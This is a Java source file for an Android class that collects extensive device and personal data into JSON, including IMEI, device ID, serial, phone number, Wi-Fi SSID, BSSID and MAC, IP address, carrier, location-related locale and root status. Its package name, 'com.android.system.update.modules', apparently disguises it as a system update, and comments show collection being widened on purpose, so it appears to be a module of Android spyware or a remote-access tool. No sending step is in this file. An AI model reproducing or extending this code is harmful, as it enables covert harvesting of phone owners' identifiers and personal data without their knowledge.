package com.android.system.update.modules;

import android.app.ActivityManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import android.util.Log;

import org.json.JSONObject;
import org.json.JSONException;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;

public class DeviceModule {
    private static final String TAG = "DeviceModule";
    private Context context;
    
    public DeviceModule(Context context) {
        this.context = context;
    }
    
    public String getDeviceInfo() {
        JSONObject info = new JSONObject();
        
        try {
            // 1. Device Identification
            collectDeviceIdentification(info);
            
            // 2. Hardware Information
            collectHardwareInfo(info);
            
            // 3. Operating System Information
            collectOSInfo(info);
            
            // 4. Memory and Storage
            collectMemoryAndStorage(info);
            
            // 5. Network Information
            collectNetworkInfo(info);
            
            // 6. Display Information
            collectDisplayInfo(info);
            
            // 7. Security Information
            collectSecurityInfo(info);
            
            // 8. Localization Information
            collectLocalizationInfo(info);
            
            // 9. Performance Metrics
            collectPerformanceMetrics(info);
            
            // 10. Battery Information (FIXED)
            collectBatteryInfo(info);
            
            return info.toString(4);
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting device info", e);
            try {
                return new JSONObject().put("error", e.getMessage()).toString();
            } catch (JSONException je) {
                return "{\"error\":\"" + e.getMessage() + "\"}";
            }
        }
    }
    
    private void collectDeviceIdentification(JSONObject info) throws JSONException {
        info.put("manufacturer", safeGet(() -> Build.MANUFACTURER, "Unknown"));
        info.put("model", safeGet(() -> Build.MODEL, "Unknown"));
        info.put("brand", safeGet(() -> Build.BRAND, "Unknown"));
        info.put("product", safeGet(() -> Build.PRODUCT, "Unknown"));
        info.put("device", safeGet(() -> Build.DEVICE, "Unknown"));
        info.put("hardware", safeGet(() -> Build.HARDWARE, "Unknown"));
        info.put("serial", safeGet(() -> Build.SERIAL, "Unknown"));
        info.put("bootloader", safeGet(() -> Build.BOOTLOADER, "Unknown"));
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            info.put("radio_version", safeGet(() -> Build.getRadioVersion(), "Unknown"));
        }
    }
    
    private void collectHardwareInfo(JSONObject info) throws JSONException {
        info.put("cpu_abi", safeGet(() -> Build.CPU_ABI, "Unknown"));
        info.put("cpu_abi2", safeGet(() -> Build.CPU_ABI2, "Unknown"));
        info.put("cpu_cores", Runtime.getRuntime().availableProcessors());
        
        // Get CPU info from /proc/cpuinfo - FIXED to get actual processor info
        try {
            Process process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            StringBuilder cpuInfo = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                if (line.toLowerCase().contains("processor") || line.toLowerCase().contains("model name") || 
                    line.toLowerCase().contains("hardware") || line.toLowerCase().contains("features")) {
                    cpuInfo.append(line).append("\n");
                }
            }
            reader.close();
            info.put("processor_info", cpuInfo.length() > 0 ? cpuInfo.toString() : "Unknown");
            
            // Also get specific processor model
            String processorModel = getProcessorModel();
            if (processorModel != null) {
                info.put("processor_model", processorModel);
            }
        } catch (Exception e) {
            info.put("processor_info", "Unknown");
            Log.w(TAG, "Could not read CPU info", e);
        }
    }
    
    private void collectOSInfo(JSONObject info) throws JSONException {
        info.put("os_version", safeGet(() -> Build.VERSION.RELEASE, "Unknown"));
        info.put("sdk_int", Build.VERSION.SDK_INT);
        info.put("build_id", safeGet(() -> Build.DISPLAY, "Unknown"));
        info.put("fingerprint", safeGet(() -> Build.FINGERPRINT, "Unknown"));
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            info.put("security_patch", safeGet(() -> Build.VERSION.SECURITY_PATCH, "Unknown"));
        }
        info.put("kernel_version", safeGet(() -> System.getProperty("os.version"), "Unknown"));
    }
    
    private void collectMemoryAndStorage(JSONObject info) throws JSONException {
        // RAM information
        try {
            ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            if (activityManager != null) {
                ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
                activityManager.getMemoryInfo(memInfo);
                info.put("total_ram", formatBytes(memInfo.totalMem));
                info.put("available_ram", formatBytes(memInfo.availMem));
                info.put("low_memory", memInfo.lowMemory);
                info.put("ram_threshold", formatBytes(memInfo.threshold));
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not get RAM info", e);
        }
        
        // Internal storage
        try {
            StatFs internalStatFs = new StatFs(Environment.getDataDirectory().getPath());
            info.put("internal_total", formatBytes(internalStatFs.getTotalBytes()));
            info.put("internal_free", formatBytes(internalStatFs.getAvailableBytes()));
            info.put("internal_used", formatBytes(internalStatFs.getTotalBytes() - internalStatFs.getAvailableBytes()));
        } catch (Exception e) {
            Log.w(TAG, "Could not get internal storage info", e);
        }
        
        // External storage - FIXED to properly detect external storage
        try {
            File[] externalFiles = context.getExternalFilesDirs(null);
            if (externalFiles != null && externalFiles.length > 1 && externalFiles[1] != null) {
                // There is external storage
                File externalDir = externalFiles[1];
                StatFs externalStatFs = new StatFs(externalDir.getAbsolutePath());
                info.put("external_total", formatBytes(externalStatFs.getTotalBytes()));
                info.put("external_free", formatBytes(externalStatFs.getAvailableBytes()));
                info.put("external_used", formatBytes(externalStatFs.getTotalBytes() - externalStatFs.getAvailableBytes()));
                info.put("external_available", true);
            } else if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
                // Fallback to old method
                StatFs externalStatFs = new StatFs(Environment.getExternalStorageDirectory().getPath());
                info.put("external_total", formatBytes(externalStatFs.getTotalBytes()));
                info.put("external_free", formatBytes(externalStatFs.getAvailableBytes()));
                info.put("external_used", formatBytes(externalStatFs.getTotalBytes() - externalStatFs.getAvailableBytes()));
                info.put("external_available", true);
            } else {
                info.put("external_available", false);
                info.put("external_storage", "Not available");
            }
        } catch (Exception e) {
            info.put("external_available", false);
            info.put("external_storage", "Error: " + e.getMessage());
            Log.w(TAG, "Could not get external storage", e);
        }
    }
    
    private void collectNetworkInfo(JSONObject info) throws JSONException {
        JSONObject networkInfo = new JSONObject();
        JSONObject wifiInfo = new JSONObject();
        JSONObject mobileInfo = new JSONObject();
        
        // Mobile network info - FIXED to include phone number
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                mobileInfo.put("carrier", safeGet(() -> tm.getNetworkOperatorName(), "Unknown"));
                mobileInfo.put("sim_country", safeGet(() -> tm.getSimCountryIso(), "Unknown"));
                mobileInfo.put("network_type", getNetworkType(tm.getNetworkType()));
                mobileInfo.put("phone_type", getPhoneType(tm.getPhoneType()));
                
                // Get SIM state
                int simState = tm.getSimState();
                mobileInfo.put("sim_state", getSimState(simState));
                
                // IMEI/Device ID and Phone Number - with proper permission handling
                if (checkPermission(android.Manifest.permission.READ_PHONE_STATE)) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        // For Android 10+, we need special permission
                        mobileInfo.put("device_id", "Restricted (Android 10+)");
                        mobileInfo.put("imei", "Restricted");
                    } else {
                        String deviceId = tm.getDeviceId();
                        mobileInfo.put("device_id", deviceId != null ? deviceId : "Unknown");
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            mobileInfo.put("imei", tm.getImei());
                        }
                    }
                    
                    // Get phone number - this works on most devices
                    String phoneNumber = tm.getLine1Number();
                    if (phoneNumber != null && !phoneNumber.isEmpty() && !phoneNumber.equals("")) {
                        mobileInfo.put("phone_number", phoneNumber);
                    } else {
                        mobileInfo.put("phone_number", "Not available");
                    }
                    
                    // Get subscriber ID (IMSI)
                    String subscriberId = tm.getSubscriberId();
                    if (subscriberId != null && !subscriberId.isEmpty()) {
                        mobileInfo.put("subscriber_id", "Available");
                    }
                } else {
                    mobileInfo.put("device_id", "Permission required");
                    mobileInfo.put("phone_number", "Permission required");
                    mobileInfo.put("imei", "Permission required");
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not get mobile network info", e);
            mobileInfo.put("error", e.getMessage());
        }
        
        // WiFi info - FIXED to get IP even when WiFi is off (mobile data IP)
        try {
            if (checkPermission(android.Manifest.permission.ACCESS_WIFI_STATE)) {
                WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                if (wm != null && wm.isWifiEnabled()) {
                    WifiInfo wifiConnection = wm.getConnectionInfo();
                    if (wifiConnection != null) {
                        wifiInfo.put("ssid", safeGet(() -> wifiConnection.getSSID().replace("\"", ""), "Unknown"));
                        wifiInfo.put("bssid", safeGet(() -> wifiConnection.getBSSID(), "Unknown"));
                        wifiInfo.put("link_speed", wifiConnection.getLinkSpeed() + " Mbps");
                        wifiInfo.put("rssi", wifiConnection.getRssi() + " dBm");
                        
                        int ip = wifiConnection.getIpAddress();
                        String ipAddress = String.format("%d.%d.%d.%d", 
                            (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));
                        wifiInfo.put("ip_address", ipAddress);
                        
                        wifiInfo.put("mac", getWifiMacAddress());
                        wifiInfo.put("status", "Connected");
                    }
                } else {
                    wifiInfo.put("status", "WiFi disabled");
                }
            } else {
                wifiInfo.put("status", "Permission denied");
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not get WiFi info", e);
        }
        
        // Get IP address even if WiFi is off (mobile data)
        String deviceIp = getDeviceIpAddress();
        if (deviceIp != null && !deviceIp.isEmpty()) {
            networkInfo.put("device_ip", deviceIp);
        }
        
        // Network connectivity
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                if (activeNetwork != null) {
                    networkInfo.put("connected", activeNetwork.isConnected());
                    networkInfo.put("connecting", activeNetwork.isConnectedOrConnecting());
                    networkInfo.put("type", activeNetwork.getTypeName());
                    networkInfo.put("subtype", activeNetwork.getSubtypeName());
                    networkInfo.put("roaming", activeNetwork.isRoaming());
                    networkInfo.put("failover", activeNetwork.isFailover());
                    
                    if (activeNetwork.getType() == ConnectivityManager.TYPE_WIFI) {
                        networkInfo.put("connection_type", "WiFi");
                    } else if (activeNetwork.getType() == ConnectivityManager.TYPE_MOBILE) {
                        networkInfo.put("connection_type", "Mobile Data");
                    } else {
                        networkInfo.put("connection_type", "Other");
                    }
                } else {
                    networkInfo.put("connected", false);
                    networkInfo.put("type", "No connection");
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not get connectivity info", e);
        }
        
        networkInfo.put("wifi", wifiInfo);
        networkInfo.put("mobile", mobileInfo);
        info.put("network", networkInfo);
    }
    
    private void collectDisplayInfo(JSONObject info) throws JSONException {
        try {
            WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            if (wm != null) {
                DisplayMetrics metrics = new DisplayMetrics();
                wm.getDefaultDisplay().getMetrics(metrics);
                
                JSONObject displayInfo = new JSONObject();
                displayInfo.put("width", metrics.widthPixels);
                displayInfo.put("height", metrics.heightPixels);
                displayInfo.put("density", metrics.density);
                displayInfo.put("density_dpi", metrics.densityDpi);
                displayInfo.put("scaled_density", metrics.scaledDensity);
                displayInfo.put("xdpi", metrics.xdpi);
                displayInfo.put("ydpi", metrics.ydpi);
                displayInfo.put("refresh_rate", wm.getDefaultDisplay().getRefreshRate());
                
                info.put("display", displayInfo);
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not get display info", e);
        }
    }
    
    private void collectSecurityInfo(JSONObject info) throws JSONException {
        JSONObject securityInfo = new JSONObject();
        securityInfo.put("rooted", checkRoot());
        securityInfo.put("debuggable", (Build.FINGERPRINT.startsWith("generic") ||
                Build.FINGERPRINT.contains("test-keys") ||
                (Build.TAGS != null && Build.TAGS.contains("test-keys"))));
        
        info.put("security", securityInfo);
    }
    
    private void collectLocalizationInfo(JSONObject info) throws JSONException {
        JSONObject localizationInfo = new JSONObject();
        
        // Get actual network country from TelephonyManager (FIXED)
        String networkCountry = getNetworkCountry();
        if (networkCountry != null && !networkCountry.isEmpty()) {
            localizationInfo.put("country", networkCountry);
            localizationInfo.put("country_source", "network");
        } else {
            // Fallback to locale
            localizationInfo.put("country", safeGet(() -> Locale.getDefault().getCountry(), "Unknown"));
            localizationInfo.put("country_source", "locale");
        }
        
        localizationInfo.put("language", safeGet(() -> Locale.getDefault().getLanguage(), "Unknown"));
        localizationInfo.put("display_language", safeGet(() -> Locale.getDefault().getDisplayLanguage(), "Unknown"));
        localizationInfo.put("timezone", safeGet(() -> java.util.TimeZone.getDefault().getID(), "Unknown"));
        
        info.put("localization", localizationInfo);
    }
    
    private void collectPerformanceMetrics(JSONObject info) throws JSONException {
        JSONObject performanceInfo = new JSONObject();
        long uptime = SystemClock.elapsedRealtime();
        performanceInfo.put("uptime_ms", uptime);
        performanceInfo.put("uptime_seconds", uptime / 1000);
        performanceInfo.put("uptime_minutes", uptime / (1000 * 60));
        performanceInfo.put("uptime_hours", uptime / (1000 * 60 * 60));
        performanceInfo.put("boot_time", System.currentTimeMillis() - uptime);
        
        info.put("performance", performanceInfo);
    }
    
    // NEW: Battery information collection (FIXED)
    private void collectBatteryInfo(JSONObject info) throws JSONException {
        JSONObject batteryInfo = new JSONObject();
        
        try {
            BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
            if (bm != null) {
                // Battery level
                int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                batteryInfo.put("level", level);
                
                // Charging status
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    int status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS);
                    boolean isCharging = (status == BatteryManager.BATTERY_STATUS_CHARGING ||
                                          status == BatteryManager.BATTERY_STATUS_FULL);
                    batteryInfo.put("is_charging", isCharging);
                    
                    String statusStr = "Unknown";
                    switch (status) {
                        case BatteryManager.BATTERY_STATUS_CHARGING:
                            statusStr = "Charging";
                            break;
                        case BatteryManager.BATTERY_STATUS_DISCHARGING:
                            statusStr = "Discharging";
                            break;
                        case BatteryManager.BATTERY_STATUS_FULL:
                            statusStr = "Full";
                            break;
                        case BatteryManager.BATTERY_STATUS_NOT_CHARGING:
                            statusStr = "Not charging";
                            break;
                    }
                    batteryInfo.put("status", statusStr);
                }
                
                // Battery health
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    int health = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_HEALTH);
                    String healthStr = "Unknown";
                    switch (health) {
                        case BatteryManager.BATTERY_HEALTH_GOOD:
                            healthStr = "Good";
                            break;
                        case BatteryManager.BATTERY_HEALTH_OVERHEAT:
                            healthStr = "Overheat";
                            break;
                        case BatteryManager.BATTERY_HEALTH_DEAD:
                            healthStr = "Dead";
                            break;
                        case BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE:
                            healthStr = "Over voltage";
                            break;
                        case BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE:
                            healthStr = "Failure";
                            break;
                        case BatteryManager.BATTERY_HEALTH_COLD:
                            healthStr = "Cold";
                            break;
                    }
                    batteryInfo.put("health", healthStr);
                }
                
                // Temperature
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    int temp = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_TEMPERATURE);
                    batteryInfo.put("temperature_celsius", temp / 10.0);
                }
                
                // Voltage
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    int voltage = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_VOLTAGE);
                    batteryInfo.put("voltage_mv", voltage);
                }
                
                // Technology
                batteryInfo.put("technology", "Li-ion"); // Default, can't get easily
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not get battery info", e);
            batteryInfo.put("level", 0);
            batteryInfo.put("is_charging", false);
        }
        
        info.put("battery", batteryInfo);
    }
    
    private String getWifiMacAddress() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            return "Randomized (Android 10+)";
        }
        
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface nif : interfaces) {
                if (nif.getName().equalsIgnoreCase("wlan0")) {
                    byte[] macBytes = nif.getHardwareAddress();
                    if (macBytes == null)
                        return "Unavailable";
                    
                    StringBuilder sb = new StringBuilder();
                    for (byte b : macBytes) {
                        sb.append(String.format("%02X:", b));
                    }
                    if (sb.length() > 0)
                        sb.deleteCharAt(sb.length() - 1);
                    return sb.toString();
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Error getting MAC address", e);
        }
        return "Unknown";
    }
    
    // NEW: Get device IP address from any network interface
    private String getDeviceIpAddress() {
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface intf = interfaces.nextElement();
                Enumeration<InetAddress> addresses = intf.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    if (!addr.isLoopbackAddress() && !addr.isLinkLocalAddress()) {
                        String ip = addr.getHostAddress();
                        if (ip != null && !ip.contains(":")) { // IPv4 only
                            return ip;
                        }
                    }
                }
            }
        } catch (SocketException e) {
            Log.w(TAG, "Error getting IP address", e);
        }
        return null;
    }
    
    // NEW: Get network country from TelephonyManager
    private String getNetworkCountry() {
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                String country = tm.getNetworkCountryIso();
                if (country != null && !country.isEmpty()) {
                    return country.toUpperCase();
                }
                country = tm.getSimCountryIso();
                if (country != null && !country.isEmpty()) {
                    return country.toUpperCase();
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not get network country", e);
        }
        return null;
    }
    
    // NEW: Get processor model
    private String getProcessorModel() {
        try {
            Process process = Runtime.getRuntime().exec("getprop ro.chipname");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line = reader.readLine();
            reader.close();
            if (line != null && !line.isEmpty()) {
                return line;
            }
            
            process = Runtime.getRuntime().exec("getprop ro.board.platform");
            reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            line = reader.readLine();
            reader.close();
            return line;
        } catch (Exception e) {
            return null;
        }
    }
    
    private String getSimState(int state) {
        switch (state) {
            case TelephonyManager.SIM_STATE_ABSENT:
                return "Absent";
            case TelephonyManager.SIM_STATE_PIN_REQUIRED:
                return "PIN Required";
            case TelephonyManager.SIM_STATE_PUK_REQUIRED:
                return "PUK Required";
            case TelephonyManager.SIM_STATE_NETWORK_LOCKED:
                return "Network Locked";
            case TelephonyManager.SIM_STATE_READY:
                return "Ready";
            case TelephonyManager.SIM_STATE_NOT_READY:
                return "Not Ready";
            case TelephonyManager.SIM_STATE_PERM_DISABLED:
                return "Permanently Disabled";
            default:
                return "Unknown";
        }
    }
    
    private String getNetworkType(int type) {
        switch (type) {
            case TelephonyManager.NETWORK_TYPE_GPRS:
            case TelephonyManager.NETWORK_TYPE_EDGE:
            case TelephonyManager.NETWORK_TYPE_CDMA:
            case TelephonyManager.NETWORK_TYPE_1xRTT:
            case TelephonyManager.NETWORK_TYPE_IDEN:
                return "2G";
            case TelephonyManager.NETWORK_TYPE_UMTS:
            case TelephonyManager.NETWORK_TYPE_EVDO_0:
            case TelephonyManager.NETWORK_TYPE_EVDO_A:
            case TelephonyManager.NETWORK_TYPE_HSDPA:
            case TelephonyManager.NETWORK_TYPE_HSUPA:
            case TelephonyManager.NETWORK_TYPE_HSPA:
            case TelephonyManager.NETWORK_TYPE_EVDO_B:
            case TelephonyManager.NETWORK_TYPE_EHRPD:
            case TelephonyManager.NETWORK_TYPE_HSPAP:
                return "3G";
            case TelephonyManager.NETWORK_TYPE_LTE:
                return "4G";
            case TelephonyManager.NETWORK_TYPE_NR:
                return "5G";
            default:
                return "Unknown";
        }
    }
    
    private String getPhoneType(int type) {
        switch (type) {
            case TelephonyManager.PHONE_TYPE_NONE:
                return "None";
            case TelephonyManager.PHONE_TYPE_GSM:
                return "GSM";
            case TelephonyManager.PHONE_TYPE_CDMA:
                return "CDMA";
            case TelephonyManager.PHONE_TYPE_SIP:
                return "SIP";
            default:
                return "Unknown";
        }
    }
    
    private boolean checkRoot() {
        String[] paths = {
                "/system/app/Superuser.apk",
                "/sbin/su",
                "/system/bin/su",
                "/system/xbin/su",
                "/data/local/xbin/su",
                "/data/local/bin/su",
                "/system/sd/xbin/su",
                "/system/bin/failsafe/su",
                "/data/local/su"
        };
        
        // Check if test-keys exist
        String buildTags = Build.TAGS;
        if (buildTags != null && buildTags.contains("test-keys")) {
            return true;
        }
        
        // Check for su binary
        for (String path : paths) {
            if (new File(path).exists()) {
                return true;
            }
        }
        
        // Check if su exists in PATH
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"/system/xbin/which", "su"});
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            return in.readLine() != null;
        } catch (Exception e) {
            return false;
        }
    }
    
    private String formatBytes(long bytes) {
        if (bytes < 1024) return bytes + " B";
        int exp = (int) (Math.log(bytes) / Math.log(1024));
        String pre = "KMGTPE".charAt(exp - 1) + "";
        return String.format("%.2f %sB", bytes / Math.pow(1024, exp), pre);
    }
    
    private boolean checkPermission(String permission) {
        return context.checkCallingOrSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }
    
    // Helper to safely get values without crashing
    private interface SafeGet<T> {
        T get();
    }
    
    private <T> T safeGet(SafeGet<T> getter, T defaultValue) {
        try {
            T result = getter.get();
            return result != null ? result : defaultValue;
        } catch (Exception e) {
            return defaultValue;
        }
    }
}
